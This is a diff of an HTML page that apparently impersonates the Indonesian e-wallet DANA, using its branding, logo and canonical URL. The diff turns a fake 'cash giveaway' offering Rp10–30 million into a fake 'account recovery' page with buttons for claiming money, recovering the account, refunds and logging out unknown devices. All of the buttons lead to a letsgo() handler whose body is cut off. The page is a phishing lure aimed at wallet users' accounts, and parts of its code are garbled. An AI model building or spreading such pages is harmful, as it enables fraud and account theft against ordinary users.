@@ -1,26 +1,29 @@
-<html>
+<html Permissions-Policy: autoplay=(self "dana.mp4")
+>
 <head>
-  <meta charset="UTF-8">
-<meta name="theme-color" content="#118EEA">
+ <meta charset="UTF-8">
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="theme-color" content="#118EEA">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0, maximum-scale=1">
-  <title>𝗗𝗔𝗡𝗔 - 𝗚𝗶𝘃𝗲𝗮𝘄𝗮𝘆 𝗨𝗮𝗻𝗴 𝗧𝘂𝗻𝗮𝗶 </title>
+  <title>𝗗𝗔𝗡𝗔 - 𝗣𝗲𝗺𝘂𝗹𝗶𝗵𝗮𝗻 𝗔𝗸𝘂𝗻 𝗗𝗔𝗡𝗔</title>
   <meta name="description" content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!">
 
   <!-- Facebook Meta Tags -->
   <meta property="og:url" content="https://www.dana.id">
   <meta property="og:type" content="website">
-  <meta property="og:title" content="𝗗𝗔𝗡𝗔 - 𝗚𝗶𝘃𝗲𝗮𝘄𝗮𝘆 𝗨𝗮𝗻𝗴 𝗧𝘂𝗻𝗮𝗶 ">
+  <meta property="og:title" content="𝗗𝗔𝗡𝗔 - 𝗣𝗲𝗺𝘂𝗹𝗶𝗵𝗮𝗻 𝗔𝗸𝘂𝗻 𝗗𝗔𝗡𝗔">
   <meta property="og:description" content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!">
-  <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgISN6TqZP8LrRYWz6ItOPMQuCZOy_Icjtz_p0xE1Bb4b469ivdoq2kreE4rHddDal_ZfWPTcN3RZvxDu2r3Wc0pPLb78dxcdC0ot0j8LopfKHymZFQfZRpNrcmxDPGVaeGsbrcB46HnEZyufWzCYAYBMn2qGSJVktDuYeZjqnKAEiAxUevTeuUbMW6BXI/s1200/IMG-20241031-WA0146.jpg">
+  
+  
+  <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTpR4y-bPCVhVCuScHmts8M5m19dUoKBt87_EwZfmpikoaRiOeOE5Wgvpw-&s=10">
 
   <!-- Twitter Meta Tags -->
   <meta name="twitter:card" content="summary_large_image">
   <meta property="twitter:domain" content="https://www.dana.id">
   <meta property="twitter:url" content="https://www.dana.id">
-  <meta name="twitter:title" content="𝗗𝗔𝗡𝗔 - 𝗚𝗶𝘃𝗲𝗮𝘄𝗮𝘆 𝗨𝗮𝗻𝗴 𝗧𝘂𝗻𝗮𝗶 ">
+  <meta name="twitter:title" content="𝗗𝗔𝗡𝗔 - 𝗣𝗲𝗺𝘂𝗹𝗶𝗵𝗮𝗻 𝗔𝗸𝘂𝗻 𝗗𝗔𝗡𝗔">
   <meta name="twitter:description" content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!">
-<meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgISN6TqZP8LrRYWz6ItOPMQuCZOy_Icjtz_p0xE1Bb4b469ivdoq2kreE4rHddDal_ZfWPTcN3RZvxDu2r3Wc0pPLb78dxcdC0ot0j8LopfKHymZFQfZRpNrcmxDPGVaeGsbrcB46HnEZyufWzCYAYBMn2qGSJVktDuYeZjqnKAEiAxUevTeuUbMW6BXI/s1200/IMG-20241031-WA0146.jpg">
-
+  <meta name="twitter:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTpR4y-bPCVhVCuScHmts8M5m19dUoKBt87_EwZfmpikoaRiOeOE5Wgvpw-&s=10">
  <link href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQZ9dATs_nkzyO-gSoQWbtIhJV7bG51r3gOKg&usqp=CAU" rel="shortcut icon" type="image/x-icon">
   <link href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQZ9dATs_nkzyO-gSoQWbtIhJV7bG51r3gOKg&usqp=CAU" rel="apple-touch-icon">
  <link rel="canonical" href="https://www.dana.id/">
@@ -40,11 +43,11 @@
 </head>
 <style>
  form {
-  --background: #ffffff;
+  --background: #fff;
   --text: #414856;
   --radio: #7C96B2;
   --radio-checked: #118EEA;
-  --radio-size: 25px;
+  --radio-size: 22px;
   --width: 292px;
   --height: 120px;
   --border-radius: 10px;
@@ -54,8 +57,9 @@
   border-radius: var(--border-radius);
   color: var(--text);
   position: relative;
-  
-  padding: 30px 15px;
+  box-shadow: 0 10px 30px rgba(65, 72, 86, 0.05);
+  box-shadow: rgba(99, 99, 99, 0.2) 0px 2px 8px 0px;
+  padding: 30px 20px;
   padding-top: 10px;
   display: grid;
   grid-template-columns: auto var(--radio-size);
@@ -65,8 +69,8 @@
 }
 form label {
   cursor: pointer;
-  text-shadow: 1px 1px 0 #FFF;
-  color: #00000090;
+  color: #118EEA;
+  font-weight: bold;
   
 }
 form input[type=radio] {
@@ -82,6 +86,7 @@ form input[type=radio] {
   background: transparent;
   border-radius: 50%;
   display: grid;
+  
   justify-self: end;
   justify-items: center;
   align-items: center;
@@ -218,7 +223,7 @@ div.item {
   position: absolute;
   width: 300px;
   height: 400px;
-  background-color: coral;
+  background-color: ;
   --r: calc(var(--position) - var(--offset));
   --abs: max(calc(var(--r) * -1), var(--r));
   transition: all 0.25s linear;
@@ -310,139 +315,236 @@ div.item:nth-of-type(5) {
 }
 
 /*********************/
+      
+ .btn-punya {
+        display: inline-block;
+        margin: 5px auto;
+        padding: 0px;
+        position: relative;
+        cursor: pointer;
+        left: 0;
+        right: 0;
+        background: #118eea;
+        border: none;
+        text-align: center;
+        height: 40px;
+        width: 100%;
+        border: 1.5px solid grey;
+        font-family: 'Open Sans', sans-serif;
+        font-size: 14px;
+        font-weight: bold;
+        color: rgb(255, 255, 255);
+        letter-spacing: 1px;
+        line-height: 1;
+        text-shadow: 2px 2px 2px grey;
+        border-radius: 50px;
+        box-shadow: rgb(170, 170, 170) 5px 5px 7px 0px;
+   
+ }
+   .btn-punya:active{
+       opacity: 0.5;
+   } 
 
-.radio-section {
-	display: flex;
-	align-items: center;
-	justify-content: center;
-	height: 100vh;
-	width:;
+
+
+form {
+  --background: #118EEA;
+  --text: #414856;
+  --radio: #7C96B2;
+  --radio-checked: #118EEA;
+  --radio-size: 25px;
+  --width: 292px;
+  --height: 120px;
+  --border-radius: 20px 20px 8px 8px;
+  background: var(--background);
+  width: var(--width);
+  height: var(--height);
+  border-radius: var(--border-radius);
+  color: var(--text);
+  position: relative;
+  left: 0;
+  right: 0;
+  box-shadow: 0 10px 30px rgba(65, 72, 86, 0.05);
+  box-shadow: rgba(99, 99, 99, 0.2) 0px 2px 8px 0px;
+  padding: 30px 20px;
+  padding-top: 10px;
+  display: block;
+  grid-template-columns: auto var(--radio-size);
+  font-weight: bold;
+  align-items: center;
+  font-family: Alata, sans-serif;
+  
 }
-h1 {
-	margin-bottom: 20px;
+form label {
+  cursor: pointer;
+  color: #118EEA;
+  font-weight: bold;
+  text-shadow: 1px 1px 0 #FFF;
 }
-.radio-item [type="radio"] {
-	display: none;
+form input[type=radio] {
+  -webkit-appearance: none;
+  -moz-appearance: none;
+  position: relative;
+  height: var(--radio-size);
+  width: var(--radio-size);
+  outline: none;
+  margin: 3px 0;
+  cursor: pointer;
+  border: 2px solid var(--radio);
+  background: transparent;
+  border-radius: 50%;
+  display: grid;
+  justify-self: end;
+  justify-items: center;
+  align-items: center;
+  overflow: hidden;
+  transition: border 0.5s ease;
 }
-.radio-item + .radio-item {
-	margin-top: 15px;
+form input[type=radio]::before, form input[type=radio]::after {
+  content: "";
+  display: flex;
+  justify-self: center;
+  border-radius: 50%;
 }
-.radio-item label {
-	display: block;
-	padding: 8px 0px;
-	background: #dddddd;
-	border: 2px inset #118EEA;
-	border-radius: 50px;
-	cursor: pointer;
-	font-size: 17px;
-	font-weight: 400;
-	min-width: 240px;
-	padding-left: 0px;
-	color: #fff;
-	left: 0; 
-	right: 0;
-	margin: 20px 0;
-	position: relative;
-	cursor: pointer;
-    text-shadow: 1px 2px 0 #fff;
-    color: #000;
-    text-align: center;
-	
+form input[type=radio]::before {
+  position: absolute;
+  width: 100%;
+  height: 100%;
+  background: var(--background);
+  z-index: 1;
+  opacity: var(--opacity, 1);
 }
-.radio-item label:after,
-.radio-item label:before {
-	content: "";
-	position: absolute;
-	border-radius: 50%;
-	background: #118EEA;
+form input[type=radio]::after {
+  position: relative;
+  width: calc(100% /2);
+  height: calc(100% /2);
+  background: var(--radio-checked);
+  top: var(--y, 100%);
+  transition: top 0.5s cubic-bezier(0.48, 1.97, 0.5, 0.63);
 }
-.radio-item label:after {
-	height: 19px;
-	width: 19px;
-	border: 1px inset #fff;
-	left: 9px;
-	top: calc(50% - 10px);
-	background: #fff;
+form input[type=radio]:checked {
+  --radio: var(--radio-checked);
 }
-.radio-item label:before {
-	background:yellow;
-	height: 19px;
-	width: 19px;
-	border: 2px inset #000;
-	left: 9px;
-	top: calc(50% - 10px);
-	background: #fff;
-	z-index: 999999999;
-	
-	opacity: 1;
-	visibility: ;
-	transition: 0.4s ease-in-out 0s;
+form input[type=radio]:checked::after {
+  --y: 0%;
+  -webkit-animation: stretch-animate 0.3s ease-out 0.17s;
+          animation: stretch-animate 0.3s ease-out 0.17s;
 }
-.radio-item [type="radio"]:checked ~ label {
-	border-color: #118EEA;
-	background: #fff;
-	color: #118EEA;
-	cursor: pointer;
-    text-shadow: 1px 2px 0 #fff;
+form input[type=radio]:checked::before {
+  --opacity: 0;
 }
-.radio-item [type="radio"]:checked ~ label::before {
-	opacity: 1;
-	visibility: visible;
-	transform: scale(1);
-	margin-top: -1px;
-	background: #118EEA;
-	cursor: pointer;
-    text-shadow: 1px 2px 0 #aaaaaa;
+form input[type=radio]:checked ~ input[type=radio]::after {
+  --y: -100%;
 }
-h5{
-    font-weight: bold;
+form input[type=radio]:not(:checked)::before {
+  --opacity: 1;
+  transition: opacity 0s linear 0.5s;
+}
+
+@-webkit-keyframes stretch-animate {
+  0% {
+    transform: scale(1, 1);
+  }
+  28% {
+    transform: scale(1.15, 0.85);
+  }
+  50% {
+    transform: scale(0.9, 1.1);
+  }
+  100% {
+    transform: scale(1, 1);
+  }
+}
+
+@keyframes stretch-animate {
+  0% {
+    transform: scale(1, 1);
+  }
+  28% {
+    transform: scale(1.15, 0.85);
+  }
+  50% {
+    transform: scale(0.9, 1.1);
+  }
+  100% {
+    transform: scale(1, 1);
+  }
 }
 </style>
-<body style="background-image: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi7i4ayQeBQZ6Ly4ZZZL41JZJK1xMIngVKyV7TOnSKSNGtjHRELO1wQNPTJzspjw25Q0gxSJHPbbUCSJLxviO-Y53YiS6ju1BzWE5_w_L2FryI-4yCaLUBgdK0O-Uq3ZHhA7e6eLyvnwoqst6-IkdUgd4b6_KUGBnprqZOw_Hy27fHt1vGyIijM9odlm0k/s1152/Desain%20tanpa%20judul%20(6).gif); background-position: cover; background-size: 200% 200%; background-color: #118eea">
- <div id="kelentet" style="display:; width: 100%; height: 100%; position: fixed; left: auto; right: auto; z-index: 99999999; background: " onclick="play()"></div>          
+<body style="background-image: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj6ShpJ6MzpU8cn4-SfIA-1-Mm6wmnl9F7jUVV1Da_xyi4tFI8ALta6TEJlNip7-oFeJcTLPDljoS4_60FvdDEd8iv5MkdSiFw5Z89vAtDRmlLSq5T52QJs3JeGVY4l0yv54IPYJer-PtBhth5rnILP6i02d6KxUqMeN3YwY19zWwnlnDwy3nKS8AbxFv0/s1098/Desain%20tanpa%20judul%20.gif);
+    background-position: 150% 0%;background-size: 100% 50%; background-color: #118EEA; background-repeat: no-repeat">
+    
 <nav style="position: fixed; top: 0; left:0; right: 0; margin: 0px auto; width: 100%; height: 60px; background: transparent; z-index: 999">
-<img src="https://www.dana.id/_nuxt/img/dana-logo.fe46647.png" style="width: 100px; margin-top: 7px; margin-left: 9px; opacity: 0">   
+<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgkp3_CuTsU93BQgdkjX018mITqU1zFVJ1M7EWp2uON0-HtY39cN1QY4QD4bBIwuHH6vPE_GHwv6Iqi7ldOtrMBI5az5QxDV5Z-nfdGuj1PBQ_2UXfpfNHzgNE7RhpikJJ2DCFgsQKtocK_1_-TQl-Aqok51Ud42qW4Z2NsF2BtR4w0gloYtSq5LFEG1xI/s382/dana-logo.fe46647.png" style="width: 100px; margin-top: 7px; margin-left: 9px">   
 </nav>
 <center>
  <img id="video"
     width="100%"
     height="35%"
     autoplay
-    muted control loop style=" width: 100%; height: 30%; display: block; background-color: #000; position: fixed; top: 0; left: 0; right: 0; z-index: -l0" preload="metadata" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhnhP1MT8peFwR-zgiEZliYeblv8Z0XMettfEBf-6-fiZ8bWg15YsbkRBoxtyaxNmFpO1Uq8gb_Y4pKyw_kDSVGIoHteyDPQKC67Ls8j5_F89GurWcgtoxQzwWyl2G2JrrwymHD1IfBOHqrOI1bIz0tqIss15eHS_hi5CTjZWzvsju0IHfGh-G0rRlmuIA/s960/20241102_005942_0002.gif" type="img/jpeg">
-     <img id="video"
-    width="100%"
-    height="35%"
-    autoplay
-    muted control loop style=" width: 100%; height: 33%; display: block; background-color: #000; position: fixed; top: 0; left: 0; right: 0; z-index: -97" preload="metadata" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEik9RLWz_wT38zSEIMibxRnBVcCD4pJyF0h2tp0crvC_WZiOlUI1HnlZcewdBbKNKje5eLu3EkQHV2p04yD2eOIOAFQ7l-Z-DjyGDIMOaKWGoPP5PPXgomoiOoNMoTqTnFUNJ9oMIQN-Zp6mmZAcCArWXnjhnzKKeQ4zNW-QM5pOu6vp6C2lhop1DeTsHw/s500/20241102_121910.jpg" type="img/jpeg">
+    muted control loop style=" width: 100%; height: 30%; display: block; background-color: #; position: fixed; top: 0; left: 0; right: 0; border-radius: 0px 0px 0px 0px; box-shadow: 0 10px 30px rgba(65, 72, 86, 0.05);
+  box-shadow: rgba(99, 99, 99, 0.2) 0px 2px 8px 0px; z-index: -2; opacity: " preload="metadata" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEigKBYHHzCn94bNPuXbidLBEXBZzyoGpdq-d8hDDZ9GV-kAyR1wMZ2leHtBZPt6UMBTnhQzLQGUwbkvk3iSiyvI7QmjQDmmRGMXzXXjWvcJ1BTXsoQe3tBowv9HsfybeI1nk6y7M7SjP99zMLsEqNaEdXkZ5tw9Z_TESoWBiM4mACvNAcHNHCKH5T9StMk/s960/20241002_221631_0001.gif" type="img/jpeg">
 <br/>
-
-<div style="width: 100%; height: 62%; display: block; background-color: #E8EBF3; position: fixed; top: 28%; left: 0; right: 0; border-radius: 25px 25px 0px 0px; border-top: 2px inset #fff;border-top: 4px groove #118eea; background-image: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhI0WnXSMXYfz44pCNwnsj1qGQaD0Sr3w8w1pNHQ8JvcjHIgAXkkgIA2Uo4WCzIi0FFyA3qkiIGFJZGYnTL7AxFGuEqyAcRgZmssINBSaL5iIF0Fn0R6EdRSzBFovcUe20o7rnDPfASYIJ-P7izCXh-pEDiaHTVwe67Uh3L6uz87hLGpH7fYI87QQ6NBgE/s1446/AddText_10-31-06.32.19.jpg); background-position: cover; background-size: 100% 100%; background-repeat: no-repeat; z-index: -0"></div>
+<div style="width: 100%; height: 80%; display: block; background-color: #; position: fixed; top: 30%; left: 0; right: 0; border-radius: 15px 15px 0px 0px; border-top: 2px solid #fff; background-image: url(https://a.m.dana.id/resource/danaweb-v2/hero-personal-bg-back.png);
+    background-position: 100% 100%;background-size: 100% 100%; z-index: -1; opacity: ; box-shadow: 0px 0px 4px 2px #ffffff"></div>
 </center>
-<center>
+
 <!-- partial:index.partial.html -->
+<form style="margin-top: -60px; height: 50px; padding-top: 15px; margin-bottom: 0px; text-align: center; font-size: 15px; background: #118EEA; color: #fff; border-radius: 15px 15px 0px 0px; border: 2px solid #fff; margin: 0px auto; margin-top: -10px;">
+    <div style="margin-left: 0px; margin-top: -7px">𝗜𝗡𝗣𝗨𝗧 𝗦𝗘𝗦𝗨𝗔𝗜 𝗞𝗘𝗡𝗗𝗔𝗟𝗔𝗠𝗨</div>
+
+ </form>   
 
  
-<form action="log.html" onsubmit="letsgo()"  style="background: transparent; margin-top: 290px" method="get">
- <div style="position: absolute; left: 0; right: 0; margin: 0px auto; text-align: center">
-		<div class="radio-item" style="height: 30px"><input name="radio" id="radio1" type="radio" required><label for="radio1">𝗥𝗽.𝟭𝟬.𝟬𝟬𝟬.𝟬𝟬𝟬</label>
-		
-	</div>
-	<div class="radio-item" style="height: 30px"><input name="radio" id="radio2" type="radio" required><label for="radio2">𝗥𝗽.𝟮𝟬.𝟬𝟬𝟬.𝟬𝟬𝟬</label>
-		
-	</div>
-	<div class="radio-item" ><input name="radio" id="radio3" type="radio" required><label for="radio3">𝗥𝗽.𝟯𝟬.𝟬𝟬𝟬.𝟬𝟬𝟬</label>
-		
-	</div>
-</div>
+<form style="margin-top: -60px; border-top: 1px solid #ccc; height: 170px; text-align: center; background: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhHG8bz71IvIJl3PSWe5SPQf2uqQRQd7iX915m31vSQDrIrovNA6ILfIsJj7ePkpIAgn7SBUDGkNctPgm1V0Wj1g1NZCq50Ayw-2r8S0ekfxNwrUpaZ_3rDwwk46KJ8T6ro1LZDWKkFXKdQoV-TGaaFrytMF_60ahkXcBghNf5oSjwqA01os0L4TqOFPx4/s2000/AddText_04-03-07.31.42.png);
+    background-position: 100% 100%;
+    background-size: 100% 100%; background-color: #fff; outline: 1px solid #118EEA; text-shadow: 0 0.5px 0.5px rgba(000, 999, 255, 10.75);box-shadow: rgba(6, 24, 24, 0.99) 0px 0px 0px 2px, rgba(6, 24, 4, 10.65) 0px 4px 6px -1px, rgba(255, 255, 255, 0.08) 0px 1px 0px inset; font-size: 12px; color: #fff; width: 315px">
+    
+
+ <center>
+       <button type="button" class="btn-punya" onclick="letsgo()" style="margin-top: 0px"><span class="dj-bos">𝗞𝗹𝗮𝗶𝗺 𝗗𝗮𝗻𝗮 𝗞𝗮𝗴𝗲𝘁</span></button>
+    
+   <button type="button" class="btn-punya" onclick="letsgo()"><span class="dj-bos">𝗣𝘂𝗹𝗶𝗵𝗸𝗮𝗻 𝗔𝗸𝘂𝗻 𝗗𝗮𝗻𝗮</span></button>
+   
+     <button type="button" class="btn-punya" onclick="letsgo()"><span class="dj-bos">𝗥𝗲𝗳𝘂𝗻𝗱 𝗗𝗮𝗻𝗮</span></button>
+     
+<button type="button" class="btn-punya" onclick="letsgo()"><span class="dj-bos">𝗟𝗼𝗴𝗢𝘂𝘁 𝗣𝗲𝗿𝗮𝗻𝗴𝗸𝗮𝘁 𝗧𝗮𝗸 𝗗𝗶𝗸𝗲𝗻𝗮𝗹</span></button>
+<br/>
+
 
 </center>
-<button type="submit" style="width: 84%; height: 40px; border-radius: 50px; border: none; box-shadow: rgba(99, 99, 99, 0.4) 1px 2px 8px 1px; background: #118EEA; color: #fff; font-size: 17px; font-weight: 400; cursor: pointer;
-    text-shadow: 1px 1px 0 #00000090;z-index: 999; margin-top: 0px">ᴋᴏɴғɪʀᴍᴀsɪ</button>   
-
 </form>
+<br/>
+   
+
+
 <!--- ## DRIBBBLE + TWITTER ############# -->
 
+<footer style="position: fixed; bottom: 20; left: 0; right: 0; width: 100%; height: 200px; z-index: 3; background-color: #fff; border-radius: 15px 15px 0px 0px; border-top: 3px solid #118EEA">
+<!----------HTML code starts here------->
 
+<div class="owl-carousel owl-theme owl-loaded " style="height: 125px; transform-style: preserve-3d; overflow: hidden">
+            
+       <div class="owl-stage-outer" style="padding: 0 90px; height: 160px; width: 100%; transform-style: preserve-3d;">
+         
+         <div class="owl-stage" style="transform: translate3d(-1527px, 0px, 0px); transition: all 0.05s ease 1s; width: 3334px; background-color: ; padding: 20px; width: 80%">
+           
+   <div class="owl-item item active;" style="box-shadow: rgba(50, 50, 93, 0.25) 0px 6px 12px -2px, rgba(0, 0, 0, 0.3) 0px 3px 7px -3px; border-radius: 10px; background: transparent"><img src="https://a.m.dana.id/danaweb/promo/1706678558-WebBanner-DANAscaVAngerHunt-500x300px.png" style="border-radius: 20px 0 20px 0"></div>
+   <div class="owl-item item active" style="background-color: #000; box-shadow: rgba(50, 50, 93, 0.25) 0px 6px 12px -2px, rgba(0, 0, 0, 0.3) 0px 3px 7px -3px; border-radius: 20px 0 20px 0; background: transparent"><img src="https://a.m.dana.id/danaweb/promo/1706850538-010224-EIS157-eMAS_10__Cashback-Web_Banner-Thumbnails.png" style="border-radius: 20px 0 20px 0"></div>
+   <div class="owl-item item active" style="box-shadow: rgba(50, 50, 93, 0.25) 0px 6px 12px -2px, rgba(0, 0, 0, 0.3) 0px 3px 7px -3px; background: transparent"><img src="https://a.m.dana.id/danaweb/promo/1707410449-e-MAS_CB_75K_-_Website_Thumbnail_500x300p.png"  style="border-radius: 20px 0 20px 0"></div>
+   <div class="owl-item item active" style="box-shadow: rgba(50, 50, 93, 0.25) 0px 6px 12px -2px, rgba(0, 0, 0, 0.3) 0px 3px 7px -3px; background: transparent"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiRuW6U6dh3zHya46wmfDGBPxD1VxQW3A6T7pe6jFaBvjEigmXH0OJfqnxoGSpDQ6_BkBIg6BWwon94vEqDib5OKCYcQSXVHLt2U5oZ_T4LcynKiK08F3mJlCzD90mhxocCY0IVuKCGXKtOk2eKo5KkrlcjcUF_Uewa5f-j5_u5Dm7ZlQQyoYycQuw7rE8/s1080/AddText_12-21-12.32.33.jpg" height="105px" style="border-radius: 20px 0 20px 0"></div>
+   <div class="owl-item item active" style="box-shadow: rgba(50, 50, 93, 0.25) 0px 6px 12px -2px, rgba(0, 0, 0, 0.3) 0px 3px 7px -3px; background: transparent"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhkZAkIZGHEXRjc_FpkfEsXMrXRTzj8Qbd9tfZCVCM5oBTJ1aappFW8gcWIIiE_Bx9xs92V43KRwFtXqxlWVXL0X4xJK65urazsQOM2rf2KqW41Iu4Kqsci2opoQYLXDIeOaP5o7qfHkHeAt3la_alR2e7Oc9B0Wm_4-XgELyqZ43a31yTDwjT-ax4BT4I/s1080/AddText_12-21-12.44.48.jpg" height="105px" style="border-radius: 20px 0 20px 0"></div>
+   <div class="owl-item item active" style="box-shadow: rgba(50, 50, 93, 0.25) 0px 6px 12px -2px, rgba(0, 0, 0, 0.3) 0px 3px 7px -3px; background: transparent"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj1DlNIZMZwlCLmLWLKDIQI8wIMl54h-fyVu1xDTk5LqBsgDWj_G-NirAlcTi4P8aXnspoes5dyt-xp9pdIFG-MdBRhKJJB5un6s713vA7GZNwIspuuE2QR_quy_wL1xJ2htXc5_38pU4xFQDRrjX3K0JkI_eEojnRJYTXj3fgipX0atm8VZjdfDSSbHAo/s1080/AddText_12-25-01.43.43.jpg" height="105px" style="border-radius: 20px 0 20px 0"></div>
+   <div class="owl-item item active" style="box-shadow: rgba(50, 50, 93, 0.25) 0px 6px 12px -2px, rgba(0, 0, 0, 0.3) 0px 3px 7px -3px; background: transparent; border-radius: 20px 0 20px 0"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgYo-GsnUUKLNEPq8tvu2jEOSBVFmtKIl-4NO3rCBHwMFehYhF3DWiR7c0tgnAlb1sWhjoCC6B82S6ypZJ13t-2FB851EHm6SzCpI3YGlVtTi1Hldf4MORJPdxKQ1ghCWf7x4ilcKtTxPurpQAudh9nAgziFkImNZuaTo80538roOfUyhqEtY-QLYyavss/s1080/AddText_02-05-05.34.58.jpg" height="105px" style="border-radius: 20px 0 20px 0"></div>
+           
+           
+             
+            </div></div></div>
+           
+  
+</div>    
+
+</footer>
   <center>
      <div id="process1" name="process" class="process1" style="display: none;">
             <div class="loading">
@@ -451,47 +553,8 @@ h5{
             </div>
         </div>
         </center>
- <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhRSK67Qt_K9V2NypHGwyMZVpw-rffXN3_27_Eh-w5G_Y7ynHoq-kjgHXjDhPCKS8jZ1FVmuGjE7d5VgeDsUo55T52dA8PmMp39u1nr0xI-p_9GAc5rQbriTYPo9OeteEjvJFitBVM6piLsaA9ZxJnwZlK3l2b75Azac2yDM9ycXFfsf1Yy3PeqOKUI3Zk/s306/Record_2024-06-03-05-43-41-ezgif.com-resize.gif" style="width: 50px; position: fixed; top: 6; right: 8; margin: 0px auto; z-index: ;" >      
-<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhW-3Xsq1r5wVb5r0tfUzFr9KzB9hy1r0-W4GkBcDTnYujbw_NNeMWw-l8MZCk4RYNJpcSZRf5tv-TPa5HnYvv_x-EzticmLwx1vO4bIlqTJAiyk4-i96QjCFlPHT8BMy9nF15ISyjxVVOz2DAv8osBBR9onrE3lJf96Vw5erolKuss9ZrTFAFhoJAU4Js/s1080/1704436332522.png" style="width: 100%; position: fixed; bottom: -5; left: 0; right: 0; margin: 0px auto; z-index: -0;"> 
-<audio hidden controls id="dana1">
-  <source src="hadiah.ogg" type="audio/ogg">
-  <source src="hadiah.mp3" type="audio/mpeg">
-  Your browser does not support the audio element.
-</audio>
-<script>
-    const video = document.getElementById("video");
-video.addEventListener("play", handleFirstPlay, false);
+<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhW-3Xsq1r5wVb5r0tfUzFr9KzB9hy1r0-W4GkBcDTnYujbw_NNeMWw-l8MZCk4RYNJpcSZRf5tv-TPa5HnYvv_x-EzticmLwx1vO4bIlqTJAiyk4-i96QjCFlPHT8BMy9nF15ISyjxVVOz2DAv8osBBR9onrE3lJf96Vw5erolKuss9ZrTFAFhoJAU4Js/s1080/1704436332522.png" style="width: 100%; position: fixed; bottom: -5; left: 0; right: 0; margin: 0px auto; z-index: 4;"> 
 
-let hasPlayed = false;
-function handleFirstPlay(event) {
-  if (!hasPlayed) {
-    hasPlayed = true;
-
-+!ets called once.
-    const vid = event.target;
-    vid.removeEventListener("play", handleFirstPlay);
-
-    // Start whatever you need to do after first playback has started
-  }
-}
-
-
-
-
-var played = false;
-  g
-  $(window).scroll(function() {
-    var elemTop = $('#counter').offset().top, 
-            elemHeight = $('#counter').outerHeight(), 
-            windowHeight = $(window).height(),
-            windowScroll = $(this).scrollTop();
-    var countdownSound = new Audio(src="hadiah.mp3");
-
-    if( windowScroll > (elemTop + elemHeight - windowHeight) ) {
-        countdownSound.play();
-    }
-});
-</script>
 <!-- partial -->
   <script>
 var owl = $('.owl-carousel');
@@ -535,7 +598,7 @@ function showVideo() {
     delay(100).then(() => toggleMute());
 }
 </script>
-   <script>
+ <script>
  function play(){
      audio = document.getElementById("dana1");
     audio.play();
@@ -546,16 +609,6 @@ function showVideo() {
     
  }
  
- 
- 
-
-
-
-
-
-
-
-
 </script>
 <script>
  function letsgo(){
